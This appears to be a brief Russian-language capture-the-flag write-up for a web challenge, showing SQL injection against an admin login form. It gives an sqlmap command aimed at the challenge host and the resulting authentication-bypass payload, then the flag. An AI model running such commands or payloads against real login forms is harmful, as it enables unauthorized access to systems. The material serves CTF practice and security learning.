# А ты админ?
Видим обычную форму ввода в админ панель, проверим на уязвимость к sql инъекциям отправив ковычку.  
Получаем ошибку, а значит сервис уязвим  
![strings](https://github.com/Lip4ik/arctf/blob/main/web/%D0%90%20%D1%82%D1%8B%20%D0%B0%D0%B4%D0%BC%D0%B8%D0%BD/solve/error.png)  

Натравим на него sqlmap  
`sqlmap -u "http://bnw.saintvegas.cc:1338" --data="user=admin&password=*" --risk=3 --level=3` 
Получаем строку, которую нужно отправить, чтобы получить доступ  
`-9028' OR 2644=2644-- pWKv`  
Наш флаг arctf{too_easy_sql_inj}   
 
